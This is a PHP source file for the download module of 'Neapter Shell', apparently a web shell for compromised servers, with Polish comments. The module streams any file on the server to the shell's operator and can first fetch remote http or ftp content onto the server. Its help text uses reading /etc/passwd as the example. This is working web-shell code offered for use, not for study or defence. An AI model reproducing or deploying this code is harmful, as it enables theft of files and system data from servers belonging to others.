<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * ModuleDownload - Pobieranie pliku
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleDownload extends ModuleAbstract
{
	/**
	 * Zdalne pobieranie
	 *
	 * @access private
	 * @var    boolean
	 */
	private $bRemote = FALSE;

	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array
		(
			'download',
			'down',
			'get'
		);
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.04 2012-11-11 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Pobieranie pliku

	Użycie:
		download ścieżka_do_pliku_http_lub_ftp

	Opcje:
		-g pobieranie przy użyciu kompresji GZIP

	Przykład:
		download /etc/passwd
		download -g /etc/passwd
		download http://www.google.com
		download ftp://google.pl/x.zip
DATA;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		/**
		 * Help
		 */
		if( $this -> oShell -> iArgc === 0 )
		{
			return $this -> getHelp();
		}

		$bGzip = in_array( 'g', $this -> oShell -> aOptv );

		/**
		 * Zdalne pobieranie
		 */
		if( preg_match( '~^(http|ftp)://~', $this -> oShell -> sArgv ) )
		{
			$sFilename = $this -> oShell -> sTmp . '/' . $this -> oShell -> sPrefix . 'download';

			/**
			 * Odczyt zdalnego pliku
			 */
			if( ( $sData = file_get_contents( $this -> oShell -> sArgv ) ) === FALSE )
			{
				return sprintf( 'Nie można połączyć się ze zdalnym hostem: "%s"', $this -> oShell -> sArgv );
			}

			/**
			 * Zapis zawartosci do pliku
			 */
			file_put_contents( $sFilename, $sData );

			$this -> oShell -> sArgv = $sFilename;

			$this -> bRemote = TRUE;
		}

		/**
		 * Plik zrodlowy musi istniec
		 */
		if( ! is_file( $this -> oShell -> sArgv ) )
		{
			return sprintf( 'Plik "%s" nie istnieje', $this -> oShell -> sArgv );
		}

		if( ( $rFile = @ fopen( $this -> oShell -> sArgv, 'r' ) ) === FALSE )
		{
			echo "Błąd odczytu pliku";
		}

		/**
		 * Naglowki
		 */
		header( 'Cache-Control: must-revalidate, post-check=0, pre-check=0' );
		header( sprintf( 'Content-Disposition: attachment; filename="%s"', basename( $this -> oShell -> sArgv ) ) );
		header( 'Content-Type: application/octet-stream' );

		/**
		 * Kompresja zawartosci strony
		 */
		ob_start( $bGzip ? 'ob_gzhandler' : NULL );

		if( ! $bGzip )
		{
			header( sprintf( 'Content-Length: %s', filesize( $this -> oShell -> sArgv ) ), TRUE );
		}

		while( ! feof( $rFile ) )
		{
			echo fread( $rFile, 32768 );
			@ ob_flush();
			@ flush();
		}

		ob_end_flush();

		/**
		 * Usuwanie zdalnego pliku z dysku
		 */
		if( $this -> bRemote )
		{
			unlink( $this -> oShell -> sArgv );
		}
		exit ;
	}

}